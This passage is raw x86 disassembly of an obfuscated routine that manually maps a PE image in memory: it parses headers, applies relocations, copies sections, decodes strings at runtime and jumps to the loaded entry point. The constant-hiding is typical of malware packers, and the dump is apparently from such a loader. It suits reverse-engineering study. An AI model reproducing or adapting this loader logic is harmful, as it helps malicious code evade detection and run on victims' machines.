  425da7:	jmp    0x425e6e
  425dac:	mov    eax,DWORD PTR [ebp-0x4]
  425daf:	xor    eax,esi
  425db1:	add    eax,edi
  425db3:	mov    DWORD PTR [ebp-0x14],eax
  425db6:	mov    eax,DWORD PTR [ebp-0x4]
  425db9:	xor    eax,esi
  425dbb:	add    eax,edi
  425dbd:	mov    DWORD PTR [ebp+0xc],eax
  425dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc3:	mov    eax,DWORD PTR [ebp-0x24]
  425dc6:	xor    ecx,esi
  425dc8:	add    ecx,edi
  425dca:	cmp    ecx,eax
  425dcc:	je     0x425dd4
  425dce:	mov    eax,DWORD PTR [eax+ebx*4]
  425dd1:	mov    DWORD PTR [ebp-0x14],eax
  425dd4:	mov    eax,DWORD PTR [ebp-0x1c]
  425dd7:	mov    eax,DWORD PTR [eax+ebx*4]
  425dda:	mov    DWORD PTR [ebp+0xc],eax
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ebp-0x14]
  425de3:	xor    eax,esi
  425de5:	add    eax,edi
  425de7:	cmp    eax,ecx
  425de9:	je     0x425e14
  425deb:	mov    eax,DWORD PTR [ebp-0x4]
  425dee:	mov    ecx,DWORD PTR [ebp-0x14]
  425df1:	xor    eax,esi
  425df3:	add    eax,edi
  425df5:	shr    ecx,0x1f
  425df8:	cmp    eax,ecx
  425dfa:	je     0x425e14
  425dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  425dff:	mov    eax,DWORD PTR [ebp+0x10]
  425e02:	mov    eax,DWORD PTR [eax+0x1e0]
  425e08:	movzx  ecx,cx
  425e0b:	push   ecx
  425e0c:	push   DWORD PTR [ebp-0xc]
  425e0f:	call   DWORD PTR [eax+0x8]
  425e12:	jmp    0x425e2d
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	add    eax,DWORD PTR [ebp+0x8]
  425e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  425e1d:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425e23:	add    eax,0x2
  425e26:	push   eax
  425e27:	push   DWORD PTR [ebp-0xc]
  425e2a:	call   DWORD PTR [ecx+0x8]
  425e2d:	mov    DWORD PTR [ebp+0xc],eax
  425e30:	mov    eax,DWORD PTR [ebp-0x4]
  425e33:	mov    ecx,DWORD PTR [ebp+0xc]
  425e36:	xor    eax,esi
  425e38:	add    eax,edi
  425e3a:	cmp    eax,ecx
  425e3c:	mov    eax,DWORD PTR [ebp-0x8]
  425e3f:	jne    0x425e52
  425e41:	mov    ecx,DWORD PTR [ebp-0x18]
  425e44:	xor    eax,esi
  425e46:	lea    eax,[ecx+eax*1+0x3272f6]
  425e4d:	mov    DWORD PTR [ebp-0x18],eax
  425e50:	jmp    0x425e62
  425e52:	mov    ecx,DWORD PTR [ebp+0xc]
  425e55:	xor    eax,esi
  425e57:	add    eax,edi
  425e59:	imul   eax,ecx
  425e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5f:	mov    DWORD PTR [ecx+ebx*4],eax
  425e62:	mov    eax,DWORD PTR [ebp-0x8]
  425e65:	xor    eax,esi
  425e67:	lea    ebx,[ebx+eax*1+0x3272f6]
  425e6e:	mov    eax,DWORD PTR [ebp-0x4]
  425e71:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e74:	xor    eax,esi
  425e76:	add    eax,edi
  425e78:	cmp    DWORD PTR [ecx+ebx*4],eax
  425e7b:	jne    0x425dac
  425e81:	mov    edx,DWORD PTR [ebp-0x10]
  425e84:	mov    eax,DWORD PTR [ebp-0x18]
  425e87:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e8a:	sub    edx,0x3272f5
  425e90:	xor    edx,esi
  425e92:	jmp    0x425c5c
  425e97:	mov    ecx,DWORD PTR [ebp-0x4]
  425e9a:	xor    ecx,esi
  425e9c:	add    ecx,edi
  425e9e:	cmp    eax,ecx
  425ea0:	mov    eax,DWORD PTR [ebp-0x4]
  425ea3:	jne    0x425ead
  425ea5:	mov    eax,DWORD PTR [ebp-0x8]
  425ea8:	jmp    0x425ead
  425eaa:	mov    eax,DWORD PTR [ebp-0x4]
  425ead:	xor    eax,esi
  425eaf:	add    eax,edi
  425eb1:	pop    edi
  425eb2:	pop    esi
  425eb3:	pop    ebx
  425eb4:	leave  
  425eb5:	ret    0xc
  425eb8:	push   ebp
  425eb9:	mov    ebp,esp
  425ebb:	sub    esp,0x28
  425ebe:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425ec5:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  425ecc:	mov    eax,DWORD PTR [ebp+0xc]
  425ecf:	mov    DWORD PTR [ebp+0xc],eax
  425ed2:	push   esi
  425ed3:	mov    eax,eax
  425ed5:	mov    eax,DWORD PTR [ebp-0x4]
  425ed8:	mov    esi,DWORD PTR [ebp+0x8]
  425edb:	mov    ecx,0x75108af
  425ee0:	xor    eax,ecx
  425ee2:	mov    edx,0x3272f6
  425ee7:	add    eax,edx
  425ee9:	cmp    esi,eax
  425eeb:	je     0x426012
  425ef1:	mov    eax,DWORD PTR [ebp+0x8]
  425ef4:	mov    esi,DWORD PTR [ebp+0x8]
  425ef7:	add    esi,DWORD PTR [eax+0x3c]
  425efa:	push   edi
  425efb:	mov    DWORD PTR [ebp+0xc],esi
  425efe:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  425f05:	mov    eax,DWORD PTR [ebp-0x1c]
  425f08:	mov    esi,DWORD PTR [ebp-0x4]
  425f0b:	mov    edi,DWORD PTR [ebp+0xc]
  425f0e:	xor    esi,ecx
  425f10:	xor    eax,ecx
  425f12:	add    esi,edx
  425f14:	cmp    DWORD PTR [edi+eax*8+0x1939828],esi
  425f1b:	je     0x42600c
  425f21:	mov    esi,DWORD PTR [ebp+0xc]
  425f24:	mov    eax,DWORD PTR [ebp+0x8]
  425f27:	add    eax,DWORD PTR [esi+0xa0]
  425f2d:	mov    esi,DWORD PTR [ebp+0x8]
  425f30:	mov    edi,DWORD PTR [ebp+0xc]
  425f33:	sub    esi,DWORD PTR [edi+0x34]
  425f36:	mov    edi,DWORD PTR [ebp-0x4]
  425f39:	xor    edi,ecx
  425f3b:	add    edi,edx
  425f3d:	mov    DWORD PTR [ebp-0x24],esi
  425f40:	cmp    esi,edi
  425f42:	je     0x42600c
  425f48:	mov    esi,DWORD PTR [ebp-0x4]
  425f4b:	xor    esi,ecx
  425f4d:	add    esi,edx
  425f4f:	mov    DWORD PTR [ebp-0x8],esi
  425f52:	push   ebx
  425f53:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  425f5a:	jmp    0x425ff6
  425f5f:	mov    esi,DWORD PTR [ebp-0x4]
  425f62:	xor    esi,ecx
  425f64:	lea    edi,[ebx-0x8]
  425f67:	add    esi,edx
  425f69:	shr    edi,1
  425f6b:	cmp    esi,edi
  425f6d:	jae    0x425fdc
  425f6f:	sub    edi,esi
  425f71:	lea    ebx,[eax+esi*2+0x8]
  425f75:	mov    DWORD PTR [ebp-0x18],edi
  425f78:	movzx  esi,WORD PTR [ebx]
  425f7b:	and    esi,0xfff
  425f81:	mov    DWORD PTR [ebp-0x14],esi
  425f84:	mov    edi,DWORD PTR [ebp-0x14]
  425f87:	mov    esi,DWORD PTR [eax]
  425f89:	sub    esi,edx
  425f8b:	add    edi,esi
  425f8d:	movzx  esi,WORD PTR [ebx]
  425f90:	shr    esi,0xc
  425f93:	xor    edi,ecx
  425f95:	mov    DWORD PTR [ebp-0x20],edi
  425f98:	mov    DWORD PTR [ebp-0x14],esi
  425f9b:	mov    esi,DWORD PTR [ebp-0x20]
  425f9e:	mov    edi,DWORD PTR [ebp+0x8]
  425fa1:	xor    esi,ecx
  425fa3:	lea    esi,[esi+edi*1+0x3272f6]
  425faa:	mov    DWORD PTR [ebp-0x20],esi
  425fad:	mov    esi,DWORD PTR [ebp-0x10]
  425fb0:	mov    edi,DWORD PTR [ebp-0x14]
  425fb3:	xor    esi,ecx
  425fb5:	add    esi,edx
  425fb7:	cmp    edi,esi
  425fb9:	jne    0x425fd1
  425fbb:	mov    esi,DWORD PTR [ebp-0x10]
  425fbe:	mov    edi,DWORD PTR [ebp-0x14]
  425fc1:	xor    esi,ecx
  425fc3:	add    esi,edx
  425fc5:	cmp    edi,esi
  425fc7:	jne    0x425fd1
  425fc9:	mov    esi,DWORD PTR [ebp-0x20]
  425fcc:	mov    edi,DWORD PTR [ebp-0x24]
  425fcf:	add    DWORD PTR [esi],edi
  425fd1:	add    ebx,0x2
  425fd4:	dec    DWORD PTR [ebp-0x18]
  425fd7:	jne    0x425f78
  425fd9:	mov    ebx,DWORD PTR [ebp-0xc]
  425fdc:	add    DWORD PTR [ebp-0x8],ebx
  425fdf:	mov    esi,DWORD PTR [ebp-0x1c]
  425fe2:	mov    edi,DWORD PTR [ebp-0x8]
  425fe5:	mov    ebx,DWORD PTR [ebp+0xc]
  425fe8:	xor    esi,ecx
  425fea:	cmp    edi,DWORD PTR [ebx+esi*8+0x193982c]
  425ff1:	jae    0x42600b
  425ff3:	add    eax,DWORD PTR [ebp-0xc]
  425ff6:	mov    esi,DWORD PTR [ebp-0x4]
  425ff9:	mov    ebx,DWORD PTR [eax+0x4]
  425ffc:	xor    esi,ecx
  425ffe:	add    esi,edx
  426000:	mov    DWORD PTR [ebp-0xc],ebx
  426003:	cmp    ebx,esi
  426005:	jne    0x425f5f
  42600b:	pop    ebx
  42600c:	mov    eax,DWORD PTR [ebp-0x28]
  42600f:	pop    edi
  426010:	jmp    0x426015
  426012:	mov    eax,DWORD PTR [ebp-0x4]
  426015:	xor    eax,ecx
  426017:	add    eax,edx
  426019:	pop    esi
  42601a:	leave  
  42601b:	ret    0x8
  42601e:	push   ebp
  42601f:	mov    ebp,esp
  426021:	sub    esp,0xd8
  426027:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42602e:	mov    DWORD PTR [ebp-0x24],0xf89c85a4
  426035:	mov    eax,DWORD PTR [ebp-0x4]
  426038:	push   ebx
  426039:	push   esi
  42603a:	mov    esi,0x75108af
  42603f:	xor    eax,esi
  426041:	push   edi
  426042:	mov    edi,0x3272f6
  426047:	add    eax,edi
  426049:	mov    DWORD PTR [ebp-0x18],eax
  42604c:	mov    eax,DWORD PTR [ebp-0x4]
  42604f:	xor    eax,esi
  426051:	add    eax,edi
  426053:	mov    DWORD PTR [ebp-0x8],eax
  426056:	mov    ebx,DWORD PTR [ebp+0x20]
  426059:	mov    eax,DWORD PTR [ebp-0x1c]
  42605c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42605f:	xor    eax,ecx
  426061:	mov    DWORD PTR [ebp-0x1c],eax
  426064:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  42606b:	mov    eax,DWORD PTR [ebp-0xc]
  42606e:	mov    ecx,DWORD PTR [ebp-0xc]
  426071:	xor    eax,ecx
  426073:	mov    DWORD PTR [ebp-0xc],eax
  426076:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  42607d:	mov    eax,DWORD PTR [ebp-0x10]
  426080:	mov    ecx,DWORD PTR [ebp-0x10]
  426083:	xor    eax,ecx
  426085:	mov    DWORD PTR [ebp-0x10],eax
  426088:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  42608f:	mov    eax,DWORD PTR [ebp-0x28]
  426092:	mov    ecx,DWORD PTR [ebp-0x28]
  426095:	xor    eax,ecx
  426097:	mov    DWORD PTR [ebp-0x28],eax
  42609a:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4260a1:	mov    DWORD PTR [ebp+0x20],0xf89ceff8
  4260a8:	mov    eax,DWORD PTR [ebp+0x8]
  4260ab:	test   eax,eax
  4260ad:	je     0x426534
  4260b3:	mov    eax,DWORD PTR [ebp+0xc]
  4260b6:	test   eax,eax
  4260b8:	je     0x426534
  4260be:	mov    eax,DWORD PTR [ebp+0x18]
  4260c1:	test   eax,eax
  4260c3:	je     0x426534
  4260c9:	mov    eax,DWORD PTR [ebp+0x20]
  4260cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4260cf:	xor    eax,0x8af
  4260d4:	add    eax,0x72f6
  4260d9:	cmp    WORD PTR [ecx],ax
  4260dc:	jne    0x426534
  4260e2:	mov    eax,DWORD PTR [ebp-0x4]
  4260e5:	xor    eax,esi
  4260e7:	add    eax,edi
  4260e9:	mov    DWORD PTR [ebp-0x30],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x4]
  4260ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4260f2:	mov    eax,DWORD PTR [ebp+0x8]
  4260f5:	add    eax,DWORD PTR [ecx+0x3c]
  4260f8:	mov    DWORD PTR [ebp+0xc],eax
  4260fb:	mov    eax,DWORD PTR [eax+0x50]
  4260fe:	test   eax,eax
  426100:	je     0x426534
  426106:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  42610d:	mov    eax,DWORD PTR [ebp-0x2c]
  426110:	xor    eax,esi
  426112:	add    eax,edi
  426114:	mov    DWORD PTR [ebp-0x2c],eax
  426117:	mov    eax,DWORD PTR [ebp-0x4]
  42611a:	mov    eax,DWORD PTR [ebx+0x190]
  426120:	mov    ecx,DWORD PTR [eax]
  426122:	mov    ecx,DWORD PTR [ecx+0x3c]
  426125:	add    ecx,DWORD PTR [eax]
  426127:	mov    eax,DWORD PTR [ebp-0x4]
  42612a:	mov    eax,DWORD PTR [ebx+0x18c]
  426130:	mov    edx,DWORD PTR [eax]
  426132:	mov    DWORD PTR [ebp-0x20],ecx
  426135:	mov    DWORD PTR [ebp+0x20],edx
  426138:	cmp    edx,edx
  42613a:	jne    0x42616e
  42613c:	mov    eax,DWORD PTR [ebx+0x1e0]
  426142:	lea    edx,[ebp-0x18]
  426145:	push   edx
  426146:	mov    edx,DWORD PTR [ebp-0xc]
  426149:	xor    edx,esi
  42614b:	add    edx,edi
  42614d:	push   edx
  42614e:	push   DWORD PTR [ecx+0x50]
  426151:	push   DWORD PTR [ebp+0x20]
  426154:	call   DWORD PTR [eax+0x1c]
  426157:	mov    eax,DWORD PTR [ebp-0x20]
  42615a:	mov    ecx,DWORD PTR [eax+0x54]
  42615d:	mov    eax,DWORD PTR [eax+0x50]
  426160:	sub    eax,ecx
  426162:	add    ecx,DWORD PTR [ebp+0x20]
  426165:	push   ecx
  426166:	call   0x426ad1
  42616b:	mov    edx,DWORD PTR [ebp+0x20]
  42616e:	mov    eax,DWORD PTR [ebx+0x194]
  426174:	mov    DWORD PTR [eax],edx
  426176:	mov    eax,DWORD PTR [ebp+0xc]
  426179:	push   DWORD PTR [eax+0x54]
  42617c:	push   DWORD PTR [ebp+0x8]
  42617f:	push   edx
  426180:	call   0x4269c7
  426185:	mov    ecx,DWORD PTR [ebp+0x20]
  426188:	mov    eax,DWORD PTR [ecx+0x3c]
  42618b:	add    eax,ecx
  42618d:	movzx  ecx,WORD PTR [eax+0x14]
  426191:	lea    ecx,[ecx+eax*1+0x18]
  426195:	mov    DWORD PTR [ebp+0x18],ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x4]
  42619b:	movzx  edx,WORD PTR [eax+0x6]
  42619f:	xor    ecx,esi
  4261a1:	add    ecx,edi
  4261a3:	mov    DWORD PTR [ebp+0xc],eax
  4261a6:	cmp    edx,ecx
  4261a8:	je     0x426255
  4261ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ecx,esi
  4261b3:	add    ecx,edi
  4261b5:	mov    DWORD PTR [ebp-0x8],ecx
  4261b8:	mov    ecx,DWORD PTR [ebp-0x24]
  4261bb:	movzx  edx,WORD PTR [eax+0x6]
  4261bf:	xor    ecx,esi
  4261c1:	sub    edx,ecx
  4261c3:	sub    edx,edi
  4261c5:	cmp    DWORD PTR [ebp-0x8],edx
  4261c8:	ja     0x426255
  4261ce:	mov    edx,DWORD PTR [ebp+0x18]
  4261d1:	add    edx,0x8
  4261d4:	mov    DWORD PTR [ebp+0x18],edx
  4261d7:	jmp    0x4261dc
  4261d9:	mov    edx,DWORD PTR [ebp+0x18]
  4261dc:	mov    eax,DWORD PTR [eax+0x38]
  4261df:	lea    ecx,[eax-0x1]
  4261e2:	mov    DWORD PTR [ebp-0x38],eax
  4261e5:	mov    eax,DWORD PTR [edx]
  4261e7:	test   eax,ecx
  4261e9:	je     0x4261f2
  4261eb:	not    ecx
  4261ed:	and    eax,ecx
  4261ef:	add    eax,DWORD PTR [ebp-0x38]
  4261f2:	mov    ecx,DWORD PTR [edx+0x4]
  4261f5:	add    ecx,DWORD PTR [ebp+0x20]
  4261f8:	push   ecx
  4261f9:	call   0x426ad1
  4261fe:	mov    edx,DWORD PTR [ebp-0x4]
  426201:	mov    eax,DWORD PTR [ebp+0x18]
  426204:	mov    ecx,DWORD PTR [eax+0x8]
  426207:	xor    edx,esi
  426209:	add    edx,edi
  42620b:	cmp    ecx,edx
  42620d:	je     0x426226
  42620f:	push   ecx
  426210:	mov    ecx,DWORD PTR [ebp+0x8]
  426213:	add    ecx,DWORD PTR [eax+0xc]
  426216:	mov    eax,DWORD PTR [eax+0x4]
  426219:	add    eax,DWORD PTR [ebp+0x20]
  42621c:	push   ecx
  42621d:	push   eax
  42621e:	call   0x4269c7
  426223:	mov    eax,DWORD PTR [ebp+0x18]
  426226:	mov    ecx,DWORD PTR [ebp-0x24]
  426229:	mov    edx,DWORD PTR [ebp-0x8]
  42622c:	add    eax,0x28
  42622f:	xor    ecx,esi
  426231:	lea    ecx,[edx+ecx*1+0x3272f6]
  426238:	mov    edx,DWORD PTR [ebp+0xc]
  42623b:	mov    DWORD PTR [ebp+0x18],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x24]
  426241:	movzx  edx,WORD PTR [edx+0x6]
  426245:	xor    eax,esi
  426247:	sub    edx,eax
  426249:	mov    eax,DWORD PTR [ebp+0xc]
  42624c:	sub    edx,edi
  42624e:	mov    DWORD PTR [ebp-0x8],ecx
  426251:	cmp    ecx,edx
  426253:	jbe    0x4261d9
  426255:	mov    edx,DWORD PTR [ebx+0x18c]
  42625b:	mov    ecx,DWORD PTR [ebp+0x20]
  42625e:	cmp    ecx,DWORD PTR [edx]
  426260:	jne    0x426289
  426262:	mov    eax,DWORD PTR [ebx+0x1e0]
  426268:	lea    edx,[ebp-0x18]
  42626b:	push   edx
  42626c:	mov    edx,DWORD PTR [ebp-0x10]
  42626f:	xor    edx,esi
  426271:	add    edx,edi
  426273:	push   edx
  426274:	mov    edx,DWORD PTR [ebp-0x20]
  426277:	push   DWORD PTR [edx+0x54]
  42627a:	push   ecx
  42627b:	call   DWORD PTR [eax+0x1c]
  42627e:	test   eax,eax
  426280:	je     0x426525
  426286:	mov    eax,DWORD PTR [ebp+0xc]
  426289:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42628f:	mov    ecx,DWORD PTR [ecx]
  426291:	xor    ecx,esi
  426293:	add    ecx,edi
  426295:	je     0x426450
  42629b:	mov    eax,DWORD PTR [ebp-0x4]
  42629e:	xor    eax,esi
  4262a0:	add    eax,edi
  4262a2:	and    DWORD PTR [ebp+0x8],0x0
  4262a6:	mov    DWORD PTR [ebp-0x14],eax
  4262a9:	mov    eax,0xf89c85c1
  4262ae:	lea    ecx,[eax+0x18]
  4262b1:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4262b8:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  4262bf:	mov    DWORD PTR [ebp-0x50],eax
  4262c2:	mov    DWORD PTR [ebp-0x4c],ecx
  4262c5:	mov    DWORD PTR [ebp-0x48],ecx
  4262c8:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4262cf:	mov    edx,DWORD PTR [ebp+0x8]
  4262d2:	mov    ecx,0x8af
  4262d7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4262dc:	mov    edx,0x72f6
  4262e1:	add    cx,dx
  4262e4:	mov    edx,DWORD PTR [ebp+0x8]
  4262e7:	inc    DWORD PTR [ebp+0x8]
  4262ea:	cmp    DWORD PTR [ebp+0x8],0x6
  4262ee:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4262f6:	jb     0x4262cf
  4262f8:	mov    ecx,0xf89c85d3
  4262fd:	mov    DWORD PTR [ebp-0xb0],eax
  426303:	mov    DWORD PTR [ebp-0x9c],eax
  426309:	mov    DWORD PTR [ebp-0x74],eax
  42630c:	mov    DWORD PTR [ebp-0x70],eax
  42630f:	lea    eax,[ecx-0x1]
  426312:	lea    edx,[ecx+0x2c]
  426315:	mov    DWORD PTR [ebp-0x64],eax
  426318:	mov    DWORD PTR [ebp-0x60],eax
  42631b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  426325:	mov    DWORD PTR [ebp-0xac],ecx
  42632b:	mov    DWORD PTR [ebp-0xa8],edx
  426331:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  42633b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426345:	mov    DWORD PTR [ebp-0x98],0xf89c85e0
  42634f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  426359:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  426363:	mov    DWORD PTR [ebp-0x8c],ecx
  426369:	mov    DWORD PTR [ebp-0x88],0xf89c852c
  426373:	mov    DWORD PTR [ebp-0x84],edx
  426379:	mov    DWORD PTR [ebp-0x80],0xf89c85d6
  426380:	mov    DWORD PTR [ebp-0x7c],ecx
  426383:	mov    DWORD PTR [ebp-0x78],0xf89c85e4
  42638a:	mov    DWORD PTR [ebp-0x6c],ecx
  42638d:	mov    DWORD PTR [ebp-0x68],0xf89c85c0
  426394:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  42639b:	xor    eax,eax
  42639d:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4263a4:	xor    cl,0xaf
  4263a7:	sub    cl,0xa
  4263aa:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4263b1:	inc    eax
  4263b2:	cmp    eax,0x17
  4263b5:	jb     0x42639d
  4263b7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263bd:	lea    ecx,[ebp-0xc0]
  4263c3:	push   ecx
  4263c4:	call   DWORD PTR [eax+0x4]
  4263c7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4263cd:	lea    edx,[ebp-0xd8]
  4263d3:	push   edx
  4263d4:	push   eax
  4263d5:	call   DWORD PTR [ecx+0x8]
  4263d8:	mov    DWORD PTR [ebp-0x40],eax
  4263db:	lea    eax,[ebp-0x14]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebx+0x18c]
  4263e5:	push   DWORD PTR [eax]
  4263e7:	mov    eax,DWORD PTR [ebp-0x40]
  4263ea:	call   eax
  4263ec:	mov    eax,DWORD PTR [ebp-0x4]
  4263ef:	xor    eax,esi
  4263f1:	add    eax,edi
  4263f3:	mov    DWORD PTR [ebp-0x34],eax
  4263f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4263f9:	mov    eax,DWORD PTR [ebp-0x14]
  4263fc:	xor    ecx,esi
  4263fe:	add    ecx,edi
  426400:	cmp    eax,ecx
  426402:	je     0x42644d
  426404:	mov    DWORD PTR [ebp-0x3c],eax
  426407:	jmp    0x426418
  426409:	mov    eax,DWORD PTR [eax]
  42640b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42640e:	mov    DWORD PTR [ebp-0x14],eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	cmp    eax,ecx
  426416:	je     0x426425
  426418:	mov    edx,DWORD PTR [eax+0x18]
  42641b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426421:	cmp    edx,DWORD PTR [ecx]
  426423:	jne    0x426409
  426425:	mov    ecx,DWORD PTR [ebx+0x18c]
  42642b:	mov    edx,DWORD PTR [eax+0x18]
  42642e:	cmp    edx,DWORD PTR [ecx]
  426430:	jne    0x42644d
  426432:	mov    ecx,DWORD PTR [ebx+0x190]
  426438:	mov    edx,DWORD PTR [ebp-0x20]
  42643b:	mov    edx,DWORD PTR [edx+0x28]
  42643e:	add    edx,DWORD PTR [ecx]
  426440:	mov    DWORD PTR [eax+0x1c],edx
  426443:	mov    eax,DWORD PTR [ebp-0x24]
  426446:	xor    eax,esi
  426448:	add    eax,edi
  42644a:	mov    DWORD PTR [ebp-0x34],eax
  42644d:	mov    eax,DWORD PTR [ebp+0xc]
  426450:	push   ebx
  426451:	push   eax
  426452:	push   DWORD PTR [ebp+0x20]
  426455:	call   0x425bd5
  42645a:	test   eax,eax
  42645c:	je     0x426525
  426462:	push   DWORD PTR [ebp+0xc]
  426465:	mov    ecx,ebx
  426467:	push   DWORD PTR [ebp+0x20]
  42646a:	call   0x425b2e
  42646f:	test   eax,eax
  426471:	je     0x426525
  426477:	mov    eax,DWORD PTR [ebp+0xc]
  42647a:	mov    edx,DWORD PTR [ebp+0x20]
  42647d:	mov    ecx,ebx
  42647f:	call   0x425a07
  426484:	test   eax,eax
  426486:	je     0x426525
  42648c:	push   ebx
  42648d:	push   DWORD PTR [ebp+0x20]
  426490:	call   0x425eb8
  426495:	test   eax,eax
  426497:	je     0x426525
  42649d:	mov    eax,DWORD PTR [ebx+0x18c]
  4264a3:	mov    edx,DWORD PTR [ebp+0x20]
  4264a6:	cmp    edx,DWORD PTR [eax]
  4264a8:	jne    0x4264c4
  4264aa:	mov    eax,DWORD PTR [ebx+0x1e0]
  4264b0:	lea    ecx,[ebp-0x18]
  4264b3:	push   ecx
  4264b4:	push   DWORD PTR [ebp-0x18]
  4264b7:	mov    ecx,DWORD PTR [ebp-0x20]
  4264ba:	push   DWORD PTR [ecx+0x54]
  4264bd:	push   edx
  4264be:	call   DWORD PTR [eax+0x1c]
  4264c1:	mov    edx,DWORD PTR [ebp+0x20]
  4264c4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4264ca:	mov    eax,DWORD PTR [eax]
  4264cc:	xor    eax,esi
  4264ce:	add    eax,edi
  4264d0:	je     0x426509
  4264d2:	mov    ecx,DWORD PTR [ebp+0xc]
  4264d5:	mov    eax,DWORD PTR [ecx+0x28]
  4264d8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4264df:	mov    esi,DWORD PTR [ebp+0x8]
  4264e2:	push   DWORD PTR [ebp+0x14]
  4264e5:	xor    esi,0x8af
  4264eb:	push   DWORD PTR [ebp+0x10]
  4264ee:	add    esi,0x72f6
  4264f4:	or     WORD PTR [ecx+0x16],si
  4264f8:	add    eax,edx
  4264fa:	push   edx
  4264fb:	call   eax
  4264fd:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a4
  426507:	jmp    0x426513
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	mov    eax,DWORD PTR [eax+0x28]
  42650f:	add    eax,edx
  426511:	call   eax
  426513:	mov    DWORD PTR [ebp-0x8],eax
  426516:	mov    eax,DWORD PTR [ebp-0x8]
  426519:	mov    ecx,DWORD PTR [ebp+0x1c]
  42651c:	mov    DWORD PTR [ecx],eax
  42651e:	mov    DWORD PTR [ebp-0x30],0x1
  426525:	cmp    DWORD PTR [ebp-0x30],0x0
  426529:	jne    0x42652f
  42652b:	and    DWORD PTR [ebp+0x20],0x0
  42652f:	mov    eax,DWORD PTR [ebp+0x20]
  426532:	jmp    0x426536
  426534:	xor    eax,eax
  426536:	pop    edi
  426537:	pop    esi
  426538:	pop    ebx
  426539:	leave  
  42653a:	ret    0x1c
  42653d:	push   ebp
  42653e:	mov    ebp,esp
  426540:	movzx  edx,WORD PTR [ecx+0x6]
  426544:	movzx  eax,WORD PTR [ecx+0x14]
  426548:	push   ebx
  426549:	push   edi
  42654a:	xor    edi,edi
  42654c:	lea    eax,[eax+ecx*1+0x18]
  426550:	test   edx,edx
  426552:	je     0x426573
  426554:	mov    ecx,DWORD PTR [eax+0xc]
  426557:	lea    ebx,[ecx+esi*1]
  42655a:	cmp    DWORD PTR [ebp+0x8],ebx
  42655d:	jb     0x42656b
  42655f:	mov    ebx,DWORD PTR [eax+0x8]
  426562:	add    ebx,ecx
  426564:	add    ebx,esi
  426566:	cmp    DWORD PTR [ebp+0x8],ebx
  426569:	jb     0x426575
  42656b:	add    eax,0x28
  42656e:	inc    edi
  42656f:	cmp    edi,edx
  426571:	jb     0x426554
  426573:	xor    eax,eax
  426575:	pop    edi
  426576:	pop    ebx
  426577:	pop    ebp
  426578:	ret    0x4
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	sub    esp,0x34
  426581:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426588:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42658f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  426596:	mov    DWORD PTR [ebp-0x8],0xf89c85c4
  42659d:	mov    DWORD PTR [ebp-0x20],0xf89c85e4
  4265a4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4265ab:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4265b2:	mov    DWORD PTR [ebp-0x10],eax
  4265b5:	mov    eax,DWORD PTR [ebp+0x8]
  4265b8:	mov    DWORD PTR [ebp-0x14],eax
  4265bb:	mov    eax,DWORD PTR [ebp-0xc]
  4265be:	push   ebx
  4265bf:	mov    ecx,0x75108af
  4265c4:	xor    eax,ecx
  4265c6:	push   esi
  4265c7:	mov    esi,DWORD PTR [ebp-0x10]
  4265ca:	mov    edx,0x3272f6
  4265cf:	add    eax,edx
  4265d1:	push   edi
  4265d2:	cmp    esi,eax
  4265d4:	je     0x4267b3
  4265da:	mov    eax,DWORD PTR [ebp-0xc]
  4265dd:	mov    esi,DWORD PTR [ebp-0x14]
  4265e0:	xor    eax,ecx
  4265e2:	add    eax,edx
